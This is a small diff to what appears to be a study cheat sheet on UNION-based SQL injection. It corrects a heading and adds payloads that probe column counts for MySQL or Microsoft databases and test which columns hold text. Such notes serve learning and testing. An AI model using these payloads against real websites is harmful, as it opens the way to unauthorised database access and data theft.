@@ -19,8 +19,12 @@ UNION Methodology
 ' UNION SELECT NULL,NULL--
 Oracle:
 ' UNION SELECT NULL FROM DUAL--
-MySQl or Microsoft
+MySQl or Microsoft:
 ' UNION SELECT NULL#
+' UNION SELECT NULL,NULL#
+Check if text in columns:
+' UNION SELECT 'abc',NULL--
+' UNION SELECT NULL,'abc'--
 ```
 
 
